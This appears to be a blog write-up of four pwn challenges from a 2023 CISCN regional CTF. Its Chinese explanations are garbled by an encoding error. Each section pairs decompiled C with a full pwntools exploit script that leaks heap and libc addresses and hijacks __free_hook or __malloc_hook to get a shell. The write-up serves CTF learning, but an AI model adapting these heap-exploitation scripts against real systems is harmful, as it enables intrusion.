---
title: 2023 ciscnè¥¿å—èµ›åŒº pwn Writeup
date: 2023-06-01 21:54:59 +0800
categories: [ctfæ¯”èµ›]
tags: [pwn, ctf]
permalink: /posts/id=65/
pin: false
published:
---



é¢˜ç›®æŒºæŠ½è±¡çš„ï¼Œå¥½ä¹…æ²¡æ‰“æ¯”èµ›äº†ååˆ†æ‰‹ç”ŸğŸ˜¢ï¼Œå†³èµ›åŠ æ²¹å§

fixçš„è¯ï¼Œoverå’Œartistéƒ½æ˜¯åŠ ä¸Šæ²™ç®±å³å¯ã€‚car_managerå’Œ223heapæŠŠfreeæˆ–è€…deleteå‡½æ•°å…¨éƒ¨nopæ‰å³å¯ã€‚

ä¸‹é¢æ˜¯breakéƒ¨åˆ†

## car_manager

C++çš„å †èœå•é¢˜ï¼ŒæŠ¹äº†å‡½æ•°åï¼Œé€†å‘èµ·æ¥æœ‰éš¾åº¦çš„è¯å¯ä»¥åŠ¨è°ƒæ¥æ¨æµ‹åŠŸèƒ½

ç”³è¯·äº†4ä¸ª0x8çš„å †å—ä½œä¸ºè½®å­æ”¾ç½®äº†tire_sizeå’Œtire_pressureï¼Œ0x68ä½œä¸ºè½¦å­æœ¬ä½“ï¼ŒåŒ…å«äº†makeã€modelã€yearç­‰ä¿¡æ¯ï¼Œåœ¨æœ€åæ”¾ç½®äº†å››ä¸ªè½®å­çš„å †å—æŒ‡é’ˆ

```c
for ( i = 0; i <= 3; ++i )
  {
    *(&v10 + i) = operator new(8uLL);
    if ( tire_size )
      **(&v10 + i) = tire_size;
    if ( tire_pressure )
      *(*(&v10 + i) + 4) = tire_pressure;
  }
  if ( year )
  {
    std::string::basic_string(v14, make);
    std::string::basic_string(v15, model);
    v1 = operator new(0x68uLL);
    sub_3644(v1, v14, v15, year, v10, v11, v12, v13);
    v7 = v1;
    std::string::~string(v15);
    std::string::~string(v14);
    sub_3C48(a1, &v7);
    std::operator<<<std::char_traits<char>>(&std::cout, "Car added successfully!\n");
  }
```

copyå‡½æ•°ä¸­åœ¨å¤åˆ¶è½®å­æ—¶ï¼Œä¹Ÿç›´æ¥å¤åˆ¶4ä¸ªè½®å­çš„å †å—æŒ‡é’ˆï¼Œè¿™å¯¼è‡´freeåŸæœ¬çš„è½¦å­å †å—åæ–°è½¦è¾†è½®å­å †å—å†…å®¹ä¸å†æ˜¯tire_sizeå’Œtire_pressureï¼Œè€Œå˜ä¸ºtcacheä¸Šçš„å †åœ°å€

```c
__int64 __fastcall sub_3B46(_QWORD *a1, _QWORD *a2)
{
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 v4; // rdx

  std::string::basic_string(a1, a2);
  std::string::basic_string(a1 + 4, a2 + 4);
  a1[8] = a2[8];
  v2 = a2[10];
  a1[9] = a2[9];
  a1[10] = v2;
  result = a2[11];
  v4 = a2[12];
  a1[11] = result;
  a1[12] = v4;
  return result;
}
```



å®é™…ä¸Šå®ç°äº†ä¸€ä¸ªUAFæ¼æ´ï¼Œfreeå‡½æ•°çš„æœºåˆ¶åˆ™æ˜¯å½“æˆ‘ä»¬freeä¸€ä¸ªå †å—æ—¶ï¼Œä¼šå°†ä¸‹ä¸€ä¸ªè½¦å­å †å—ä¾æ¬¡å›é€€ä¸€æ ¼ï¼Œä½†é«˜ä½ä»ä¿ç•™

è§¦å‘æ¼æ´å³å¯å®Œæˆå †åœ°å€çš„æ³„éœ²ï¼Œåˆ©ç”¨UAFåŠ«æŒtcacheå †å—çš„fdï¼Œç”³è¯·åˆ°unsortbinå †å—æ³„éœ²libcï¼Œå†æ¬¡åŠ«æŒfdç”³è¯·åˆ°free_hookå®Œæˆåˆ©ç”¨

(å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ç”³è¯·unsortbinä½ç½®å †å—åå¯¼è‡´åŒå‘é“¾è¡¨è¢«ç ´åï¼Œæ— æ³•å†ä»unsortbiné‡Œç”³è¯·å †å—ï¼Œè¦æ§åˆ¶åŠ«æŒçš„tcacheä½ç½®ï¼Œæ»¡è¶³ç”³è¯·ä¸€æ¬¡éœ€è¦çš„4ä¸ª0x20å †å—)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = process("./car_manager")
elf = ELF("./car_manager")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


def add(make,model,year,size,pressure):
    sla("Please enter your choice:",1)
    sla("Enter the make of the car: ",make)
    sla("Enter the model of the car: ",model)
    sla("Enter the year of the car: ",year)
    sla("Enter the size of tire : ",size)
    sla("Enter the pressure of tire : ",pressure)

def dele(idx):
    sla("Please enter your choice:",2)
    sla("Enter the index of the car to delete: ",idx)

def find(make,model,year):
    sla("Please enter your choice:",3)
    sla("Enter the make of the car to find: ",make)
    sla("Enter the model of the car to find: ",model)
    sla("Enter the year of the car to find: ",year)

def edit(idx, make, model, year, choice, tire_size, tire_pressure, tire_idx=None):
    sla("Please enter your choice:",4)
    sla("Enter the index of the car to modify: ",idx)
    sla("Enter the new make of the car: ",make)
    sla("Enter the new model of the car: ",model)
    sla("Enter the new year of the car: ",year)
    sla("Do you want to change all tires?(1/0)",choice)
    if choice==1:
        sla("Enter the new size of tire : ",tire_size)
        sla("Enter the new pressure of tire : ",tire_pressure)
    else:
        sla("Enter the idx of tire : ",tire_idx)
        sla("Enter the new size of tire : ",tire_size)
        sla("Enter the new pressure of tire : ",tire_pressure)

def copy(idx):
    sla("Please enter your choice:",5)
    sla("Enter the index of the car to copy: ",idx)


def show():
    sla("Please enter your choice:",6)

for i in range(0x101):
    add('e4l4',i,1999,0x10,0x10)


copy(0)
copy(255)
dele(0)
show()
ru("Tire Sizes: 0, ")
heap_base_2 = int((ru(",")[:-1]),10)
lg('heap_base_2')

ru("Tire Pressures: 0, ")
heap_base_1 = int((ru(",")[:-1]),10)
lg('heap_base_1')

heap_base = (heap_base_1 << 32)+heap_base_2-0x011eb0
lg('heap_base')

unsort_heap_2 = (heap_base+0x01a0b0)&0xffffffff
unsort_heap_1 = (heap_base+0x01a0b0)>>32
edit(256,'e4l4',1,1999,1,unsort_heap_2+0x10,unsort_heap_1)
add('e4l4',259,1999,0,0)

show()
ru("Car 258:")
ru(", ")
libc_base_2 = int((ru(",")[:-1]),10)
ru("Tire Pressures: ")
ru(", ")
libc_base_1 = int((ru(",")[:-1]),10)
libc_base = (libc_base_1 << 32)+libc_base_2-0x1ecbe0
lg("libc_base")

free_hook = libc_base + 0x1eee48
system = libc_base + 0x52290
sh = 0x68732f6e69622f

dele(257)
show()

edit(254,'e4l4',1,1999,0,free_hook&0xffffffff,free_hook>>32,1)
edit(254,'e4l4',1,1999,0,sh&0xffffffff,sh>>32,0)
add('e4l4','e4l4',1999,system&0xffffffff,system>>32)
dele(254)

ia()
```



## artist

è¿™é“é¢˜æ¼æ´æŒºå¤šï¼Œå…³é”®æ¼æ´ç‚¹åœ¨äº3å·åŠŸèƒ½åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªptrå †å—åœ°å€æ”¾è¿›bufï¼Œç„¶åå¯ä»¥è¿›å…¥ä¸€ä¸ªæ‰§è¡Œåˆ†æ”¯ï¼Œè¾“å…¥yeså¯ä»¥åœ¨bufé™„è¿‘çš„ä½ç½®å†™å…¥0ï¼Œè¿™é‡Œå¯ä»¥å®ç°ä»»æ„libcåœ°å€å†™0ï¼Œä½†ä¼¼ä¹ç”¨ä¸ä¸Šã€‚æœ€åä¼šæ‰§è¡Œä¸€ä¸ªå¯¹bufçš„0x10çš„å†™å…¥ï¼Œç”±äºç¬¬äºŒæ¬¡å¼€å§‹ä¸ç”¨å†è¾“å…¥idxå°±èƒ½ç›´æ¥å¯¹bufè¿›è¡Œä¿®æ”¹ï¼Œå¦‚æœbufçš„å †å—è¢«freeï¼Œå°±è¾¾åˆ°äº†ä¸€ä¸ªUAFçš„æ•ˆæœ

```c
__int64 sub_1411()
{
  unsigned int v1; // [rsp+8h] [rbp-38h] BYREF
  int v2; // [rsp+Ch] [rbp-34h]
  char s1[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  if ( isFirst )
  {
    write_s("What? Great artists need scrap paper for art?\n");
    write_s("idx: \n");
    __isoc99_scanf("%u", &v1);
    buf = *(&ptr + v1 + 4);
    isFirst = 0;
  }
  write_s("do you want crazy\n");
  __isoc99_scanf("%3s", s1);
  if ( !strncmp(s1, "yes", 3uLL) )
    v2 = 1;
  if ( v2 )
    set_0();
  return read_buf();
}
```

idxä¸ä¼šå‡å°‘ï¼Œæœ€å¤§ä¸º19(éœ€è¦æ³¨æ„çš„æ˜¯,è€Œæ‰§è¡ŒåŠŸèƒ½2å½“idxå¤§äº>15æ—¶ç¨‹åºä¼šexit)

æ”¾ç½®idxè¿‡å¤§ï¼Œæ‰€ä»¥åˆ©ç”¨UAFåŠ«æŒç”³è¯·åˆ°tcache_structï¼Œä¿®æ”¹tcacheå †å—ä¸ªæ•°ï¼Œä»è€Œå°†å †å—æ”¾å…¥unsortbinæ³„éœ²libcåœ°å€ï¼ŒåŒæ ·çš„åŠæ³•å†åŠ«æŒtcacheçš„fdç”³è¯·free_hook



```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(con):
    sla(">",1)
    p.sendafter("input some",con)

def edit(idx,con):
    sla(">",2)
    sla("idx:",idx)
    sla("Would you like to make final edits?",1)
    p.sendafter("input your content",con)

def show(idx):
    sla(">",2)
    sla("idx:",idx)
    sla("Would you like to make final edits?",2)

# x/32gx $rebase(0x4088)

buf = 0x4060
ptr = 0x4088

sla("Let us get to know each other.",'e4l4')

add('a')# 0
add('a')# 1
add('a')# 2
show(2)
show(0)
show(1)
add('a')# 3
add('a')# 4


sla(">",3)
sla("idx:",3)
sa("do you want crazy",'f\n')
sa("Go ahead and doodle for your artistic inspiration.",'a')


show(3)
ru("Please enjoy your masterpiece.\n")
heap_base = uu64()
lg("heap_base")

sla(">",3)
sa("do you want crazy",'f\n')
sa("Go ahead and doodle for your artistic inspiration.",p64(heap_base-0x261+0x10))

add('a')# 5
add('\x00'*0xe+'\x07\x00')# 6

show(5)
show(4)

edit(6,'\x00'*0x10)

add('a')# 7
show(7)
libc_base = l64()-0x1ecc61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base +libc.sym["system"]

add('a')# 8
add('a')# 9

show(8)
show(9)
sla(">",3)
sa("do you want crazy",'f\n')
sa("Go ahead and doodle for your artistic inspiration.",p64(free_hook))

add('/bin/sh\x00')# 10
add(p64(system))
# dbg()
show(10)

ia()
```



## over

é¢˜ç›®çœ‹ä¸Šå»å­˜åœ¨ä¸€ä¸ªå¾ˆå¤æ‚çš„ç®—æ³•ï¼Œè§‚å¯Ÿå‘ç°å…¶3ä¸ªåŠŸèƒ½éƒ½æ˜¯å¯¹*(&ptr + num + 12)è¿™ä¸ªä½ç½®çš„å€¼è¿›è¡ŒåŠ å‡å¼‚æˆ–ï¼Œè€Œnumå´ä¸ºintç±»å‹

```c
__int64 *sub_156C()
{
  int v0; // ecx
  __int64 *result; // rax
  int i; // [rsp+4h] [rbp-4Ch]
  int v3; // [rsp+8h] [rbp-48h]
  int v4; // [rsp+1Ch] [rbp-34h]
  int v5[10]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  show("what do you want to choose\n");
  v3 = read_num();
  if ( v3 > 4 )
    exit(0);
  v4 = (0x35DA * v3 - 0x4B2D) ^ 0xC925;
  for ( i = 0; i <= 9; ++i )
  {
    v5[i] = (0x35DA * v3) ^ v3 ^ (0x35DA * v3) ^ 42641;
    v5[i] += v4;
  }
  ptr += v4;
  show("some add\n");
  v0 = *(&ptr + v3 + 12) + read_num();
  result = &ptr;
  *(&ptr + v3 + 12) = v0;
  return result;
}
```

é¢˜ç›®å¼€å§‹å°†putsçš„çœŸå®åœ°å€æ”¾åœ¨äº†puts_addr å˜é‡ä¸Šã€‚ç”±äºæœ‰æ•ˆçš„è¾“å‡ºå‡½æ•°æ— æ³•æ³„éœ²libcï¼Œè¿™é‡Œå¯ä»¥æ§åˆ¶numæ¥ä¿®æ”¹puts_addrä¸ºsystemå‡½æ•°çš„çœŸå®åœ°å€ï¼Œä¹Ÿå°±æ˜¯putså‡½æ•°çš„çœŸå®åœ°å€+ç›¸å¯¹åç§»=systemå‡½æ•°çš„çœŸå®åœ°å€ï¼Œå†è°ƒç”¨4åŠŸèƒ½å³å¯å®ç°getshellã€‚

numçš„è®¡ç®—å¯ä»¥å‚è€ƒæ±‡ç¼–ï¼Œ0x28/4-0xc=-2

```c
//*(&ptr + v3 + 12) = v0;
.text:0000000000001688 48 83 C0 0C                   add     rax, 0Ch
.text:000000000000168C 48 8D 14 85 00 00 00 00       lea     rdx, ds:0[rax*4]
.text:0000000000001694 48 8D 05 C5 29 00 00          lea     rax, ptr
.text:000000000000169B 89 0C 02                      mov     [rdx+rax], ecx
.text:000000000000169E 90                            nop
```



```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote("172.16.9.41","8888")
# p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

sla("what is your name",'/bin/sh')

def add(idx,con):
    sla("what do you want to do",1)
    sla("what do you want to choose",idx)
    sla("some add\n",con)

def clean(idx,con):
    sla("what do you want to do",2)
    sla("what do you want to choose",idx)
    sla("some add\n",con)

def xor(idx,con):
    sla("what do you want to do",3)
    sla("what do you want to choose",idx)
    sla("some add\n",con)

# dbg(0x153F)
clean(-2,0x032190)
sla("what do you want to do",4)
ia()
```



## 223heap

é¢˜ç›®ä¸€å…±èƒ½ç”³è¯·ä¸‰ç§å¤§å°çš„å †å—ï¼Œåˆ†åˆ«å­˜æ”¾åœ¨free/ptr/bufä¸­(è¿™é‡Œçš„freeè¦†ç›–å¹¶ä¸èƒ½è¾¾åˆ°æ‰§è¡Œå‡½æ•°çš„ç›®çš„ï¼Œå› ä¸ºfree_gotå·²ç»å­˜åœ¨çœŸå®å‡½æ•°åœ°å€)ï¼Œé€šè¿‡åˆ‡å‰²unsortbinå †å—å¯ä»¥è·å¾—libcåœ°å€

deleåŠŸèƒ½0/1/2åˆ†åˆ«æŒ‡ä»£buf ptr freeï¼Œéš¾ç‚¹åœ¨äºfree(1)å³free ptræ—¶ï¼Œä¼šå¯¼è‡´ptr_sizeè¢«ç½®ä¸º0ï¼Œæ²¡æœ‰åŠæ³•ä½¿ç”¨showåŠŸèƒ½ï¼Œæ‰€ä»¥è¦æ³¨æ„æ³„éœ²åœ°å€ä¹‹å‰ä¸èƒ½free(1)

ç”±äºåœ¨è¿›è¡Œfreeæ—¶å¹¶ä¸ä¼šå¯¹æŒ‡é’ˆç½®0ï¼Œå¯ä»¥æ“ä½œæŒ‡é’ˆè®©å®ƒä»¬æŒ‡å‘åŒä¸€å †å—ï¼Œå®ç°å †å ï¼Œåˆ©ç”¨editåŠŸèƒ½å®ç°UAFçš„åˆ©ç”¨

```shell
00000000006020c0     00000000009b6010 00000000009b6010
00000000006020d0     00000000009b6010 0000000000000000
```

ç”±äº2.23åªèƒ½ç”³è¯·fastbinï¼Œæ‰€ä»¥ç”³è¯·0x68çš„å †å—ï¼ŒåŠ«æŒåˆ°malloc_hook-0x23ï¼Œè¦†ç›–ä¸ºone_gadget

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,con):
    sla("input:",1)
    sla("please enter size of malloc :",size)
    p.sendafter("please enter contents of your heap:",con)

def edit(con):
    sla("input:",4)
    sla("please enter what you want to edit:",con)

def show():
    sla("input:",2)

def dele(idx):
    sla("input:",3)
    sla("please enter which heap you want to delete:",idx)

def malloc_s():
    sla("input:",5)


buf = 0x6020C0
puts = elf.plt['puts']

add(0x300,p64(puts))
add(0x38,'a')
dele(2)

add(0x100,'a')
show()
libc_base = l64()-0x3c4e61
lg('libc_base')
free_hook = libc_base+0x3c67a8
malloc_hook = libc_base+libc.sym["__malloc_hook"]
lg('free_hook')
one = libc_base + 0x4527a 

dele(1)
add(0x68,'a')
dele(2)
edit(p64(malloc_hook-0x23))
add(0x60,'a')
add(0x60,'a'*0x13+p64(one))

malloc_s()
ia()
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
  '''
```

